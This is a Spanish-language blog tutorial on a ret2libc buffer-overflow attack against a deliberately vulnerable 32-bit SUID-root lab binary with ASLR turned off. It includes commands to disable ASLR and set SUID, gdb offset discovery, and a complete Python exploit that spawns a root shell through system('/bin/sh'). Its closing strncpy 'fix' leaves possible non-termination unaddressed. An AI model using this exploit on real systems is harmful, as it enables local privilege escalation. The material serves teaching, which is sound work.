---
title: Buffer Overflow Ret2libc sin ASLR
author: thespartoos
date: 2023-10-23 00:34:00 +0800
tags: [Binary Exploitation]
categories: [Buffer Overflow x32]
image:
  path: http://localhost:4000/assets/img/favicons/Ret2Libc/portada.png
  alt: 
---

### ¿Qué es Ret2Libc?

Ret2Libc ("Return to libc") es una técnica que se utiliza para eludir las protecciones de seguridad de un programa o sistema y ejecutar codigo malicioso. Este tipo de ataques suele producirse al encontrar un Buffer Overflow en un programa y no poder ejecutar su shellcode debido a que esta habilitado el **DEP**, en los programas se representa como&nbsp; `NX`.

Lo ocurre en esta técnica es que en vez de utilizar tu shellcode personalizado nos podemos aprovechar de las llamadas a funciones de la biblioteca estándar&nbsp; `(libc)`&nbsp; ya cargadas en memoria del programa.

### Situación de Ret2libc

En la situación que viene a continuación se va abusar un binario de 32 bits en una máquina de x86 y que tiene el<br>`ASLR desactivado`.

### ¿Qué es Libc?

Es una parte fundamental de la programación en lenguaje C y proporciona un conjunto de funciones y rutinas que son esenciales para la creación de programas en C.

### ¿Qué es el ASLR?

El ASLR es una técnica de seguridad cuya función consiste en aleatorizar la ubicación de las áreas clave de la memoria de un programa en ejecución. Por lo tanto para el ataque de Ret2libc sin ASLR debe de estar desactivado.

Para desactivarlo en nuestra máquina de 32 bits simplemente debemos de ejecutar el siguiente comando como **root**

```shell
echo 0 > /proc/sys/kernel/randomize_va_space
```

El resultado de dicha comando dará lugar a que no aleatoriza las direcciones de la memoria que es algo fundamental para que el Ret2libc sin ASLR funcione.

![](http://127.0.0.1:4000/assets/img/favicons/StackBased/ldd.png)

Si nos fijamos bien en la segunda línea del output contiene la dirección de memoria de libc y comprobamos que es la misma en cada ejecución: `0xb7e08000`.

### Funcionamiento del programa vulnerable

![](http://127.0.0.1:4000/assets/img/favicons/StackBased/code_vuln.png)

Este sería el codigo correspondiente al binario compilado al que se va a explotar un buffer overflow a través de la técnica de Ret2libc.

Si quieres realizar las mismas pruebas que se van a realizar en este post. Para poder compilar el binario en cuestión debes ejecutar el siguiente comando.

```shell
gcc -fno-stack-protector -m32 file.c -o fileVuln
```

Para empezar debemos de tener en cuenta el funcionamiento del flujo del programa. En este caso al ver el código podemos observar que esta esperando datos que se adjuntan como argumento en donde lo que hace es copiar lo que le pasamos como argumento a una variable en la memoria llamada `buffer` con la función `strcpy`

> La función `strcpy` es insegura en C/C++.
{: .prompt-danger }

Lo que ocurre con la función de strcpy es que no realiza verificaciones sobre el tamaño de los buffers y puede llevar a buffer overflow como se podrá ver a lo largo del post.

Para hacerlo algo mas elaborado vamos a asignarle el permiso SUID al binario y como propietario y grupo le añadiremos como root.

```shell
chown root:root fileVuln
chmod u+s fileVuln
```

Una vez hecho esto a la hora de ejecutar eel binario con nuestro usuario test, staremos ejecutando el binario como el usuario root.

### Detección de Buffer Overflow

Esto sería un ejemplo de como funciona el programa de manera técnica la ejecución del binario

![](http://127.0.0.1:4000/assets/img/favicons/StackBased/exec_file.png)

En la primera linea de comandos lo que ha ocurrido es que en la variable buffer la cual tiene de tamaño 64 bytes, está almacenando la letra que le estamos pasando como argumento en este caso la letra **"A"**.

Lo que está ocurriendo en la segunda línea es que al tener **64 bytes** para almacenar en la variable `buffer`, se esta intentando almacenar más de lo se ha definido en esa variable, por lo tanto cuando llega a la funcion `strcpy` intenta copiar muchos bytes a la variable `buffer`, &nbsp; por tanto el flujo del programa corrompe debido a exceso de buffer.

Uno de los pasos previos de cuando tenemos un binario y no sabemos como actúa podemos ejecutar los siguientes comandos para obtener más información acerca del binario y saber como explotarlo.

Uno de los pasos previos de cuando tenemos un binario y no sabemos como actúa podemos ejecutar los siguientes comandos para obtener más información acerca del binario y saber como explotarlo.

```shell
gef➤  checksec 
[+] checksec for '/home/thespartoos/Desktop/fileVuln'
Canary                        : ✘ 
NX                            : ✓
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Como podemos ver el reflejo del comando checksec desde el menu de gdb con [**peda**](https://github.com/longld/peda) nos permite ver que tiene el <br>`DEP (Data execution prevention)` activado, es el apartado de **NX**, por lo tanto no podemos ejecutar codigo malicioso directamente en la pila (esp). Pero este no es el final del camino, con la técnica del **Ret2Libc** nos podremos aprovechar de las funciones de la biblioteca de &nbsp;`libc`&nbsp; que fueron importadas por el binario.

### Explotación de Ret2Libc

Para esta parte será necesario entender como funciona el flujo del programa cuando se excede el buffer.

Cuando estamos pasando las **"A"** como argumento, lo que ocurre es que se están sobrescribiendo **algunos** de los registros:

> Estos registros son en máquinas de 32 bits (x86).
{: .prompt-warning }

1. ESP: Apunta al tope de la pila y se utiliza para agregar y eliminar datos de la pila.<br>
2. EBP: Gestiona las funciones y procedimientos de la pila.<br>
3. EIP: Contiene la siguiente dirección de la memoria a la cual seguirá el flujo del programa.

Esto es un ejemplo a nivel visual de como funciona el flujo del programa cuando corrompe.

<img src="https://itandsecuritystuffs.files.wordpress.com/2014/03/image_thumb2.png?w=617&h=480">

Es importante tener en cuenta esto tres registros ya que debemos de estar pendientes para posteriormente ejecutar la técnica de Ret2libc correctamente.

Empieza por el ESP y continua sobrescribiendo el resto de registros mencionados anteriormente.

Para poder ver como se estan registrando esos registros existe **gdb**, que para quien no lo sepa nos permite analizar el binario a bajo nivel viendo como funciona el flujo del programa.

El primer paso que debemos de seguir es calcular el numero de exacto de bytes que debemos pasar hasta que llegamos a controlar el registro EIP.

```shell
gdb ./fileVuln
# Una vez dentro de gdb
r $(python3 -c 'print("A"*100)')
```

Dado los comandos anteriores dará como resultado lo siguiente.

![](http://127.0.0.1:4000/assets/img/favicons/StackBased/registers.png)

Como podemos observar los registros de (ESP, EBP y EIP) están sobrescritos por nuestras **"A"**, por lo tanto en lo primero que nos tenemos que fijar es en &nbsp;`EIP`&nbsp;podemos observar que apunta a la dirección de ***0x41414141*** que como nos lo indica a su derecha son nuestras **"A"**

#### Descubrir el offset 

De las primeras cosas que debemos de averiguar para poder explotar el Ret2libc es conocer el numero de bytes exactos para controlar el registro de EIP. Para ello podemos hacerlo de manera manual pero utilizando [**gdb-peda**](https://github.com/longld/peda).

![](http://127.0.0.1:4000/assets/img/favicons/StackBased/patternCreate.png)

Lo que acabamos de realizar es generar un patrón por peda que posteriormente nos permitirá conocer el valor exacto de bytes que debemos de enviar para poder controlar exactamente el EIP.

Volvemos a ejecutar el gdb con el binario y ejecutamos el siguiente comando.

```shell
gdb ./fileVuln
# Una vez dentro de gdb
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

una vez ejecutado podremos saber el `offset`&nbsp; **(cantidad de bytes)** exacto para poder manipular el EIP.

![](http://127.0.0.1:4000/assets/img/favicons/Ret2Libc/offset.png)

Exactamente son 76 bytes que debemos de enviar para controlar el EIP. Para poder saber si es la cantidad exacta podemos comprobarlo de manera manual de manera rápida.

```shell
gdb ./fileVuln
# Una vez dentro de gdb
r $(python3 -c 'print("A"*76 + "B"*4)')
```

La dirección a la que debería de apuntar EIP es ***0x42424242*** correspondiente a nuestras **"B"**.

![](http://127.0.0.1:4000/assets/img/favicons/StackBased/eipM.png)

#### Plan de ataque

Cuando está el &nbsp;`ASLR`&nbsp; desactivado y por las circunstancias anteriormente mencionadas realizando el ataque de Ret2Libc, nos debemos de aprovechar de las funciones importadas por la biblioteca de **libc**.

El flujo de este ataque consiste en poder controlar el EIP para poder apuntar a la direccion de system para poder realizar una llamada a nivel de sistema. A su vez deberemos de indicarle la direccion de exit, la cual se refiere a la salida del programa una vez el programa concluya, aunque la direccion de exit como tal no es realmente necesario ponerla, podemos poner cualquier otra dirección. Por último deberemos de poner el argumento del comando que quiero que me ejecute la llamada del sistema, en este caso &nbsp;`/bin/sh`.

Antes que nada vamos a ejecutar el binario desde gdb-peda con el comando &nbsp;`r <whatever>`&nbsp; y para poder obtener dichas direcciones deberemos de ejecutar los siguientes comandos dentro de gdb-peda.

![](http://127.0.0.1:4000/assets/img/favicons/Ret2Libc/data.png)

### Desarrollo del exploit

Esta vez el exploit sera en Python3, en el post anterior lo hicimos en python2.

El funcionamiento a tener en mente para nuestro exploit sera el siguiente.

```python
EIP = system_addr + exit_addr + bin_sh_addr
```

Por lo tanto con las direcciones de obtuvimos anteriormente y con el tipo de ataque en mente lo único que queda es programar el exploit.

```python
#!/usr/bin/python3

from struct import pack
from subprocess import call

#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xb7e42db0 <__libc_system>
#gdb-peda$ p exit
#$2 = {<text variable, no debug info>} 0xb7e369e0 <__GI_exit>
#gdb-peda$ find "/bin/sh" all
#Searching for '/bin/sh' in: all ranges
#Found 1 results, display max 1 items:
#libc : 0xb7f63b2b ("/bin/sh")

	

if __name__ == '__main__':

	# EIP -> system + exit + bin_sh

	system_addr = pack("<I", 0xb7e42db0)
	exit_addr = pack("<I", 0xb7e369e0)
	bin_sh_addr = pack("<I", 0xb7f63b2b)

	offset = 76
	junk = b"A"*offset
	EIP = system_addr + exit_addr + bin_sh_addr

	payload = junk + EIP

	call(["/home/test/ret2libc/fileVuln"], payload)

```

Este sería el exploit el cual con la libreria subprocess con la funcion call podemos ejecutar desde el mismo exploit el binario en cuestión junto con el payload como argumento para poder realizar el ataque y el resultado sería el siguiente.

![](http://127.0.0.1:4000/assets/img/favicons/Ret2Libc/final.png)

Finalmente hemos logrado poder realizar una llamada a nivel de sistema ejecutandonos una **/bin/sh** pudiendo ejecutar comandos.

### Recommendation

Evitar las funciones inseguras como strcpy y en su lugar reemplazarla por la función strncpy añadiendolo en el código tal que así.

```c
#include <stdio.h>

void notvulnerable(char *buff) {
    char buffer[64];
    strncpy(buffer, buff, sizeof(buffer));
}

void main (int argc, char **argv) {
    notvulnerable(argv[1]);
}
```

Como podemos ver en la linea hemos sustituido la función insegura de &nbsp;`strcpy`&nbsp; por la de **strncpy** en donde dicha función comprobará antes la longitud de lo que desea copiar con el buffer de la memoria a donde lo va a copiar y el flujo del programa no corrompe.

### Conclusion

Aunque un binario tenga protecciones es posible poder evadir dichas restricciones como hemos visto. En el siguiente post realizamos la misma técnica pero pudiendo evadir otra capa de seguridad, el ASLR.





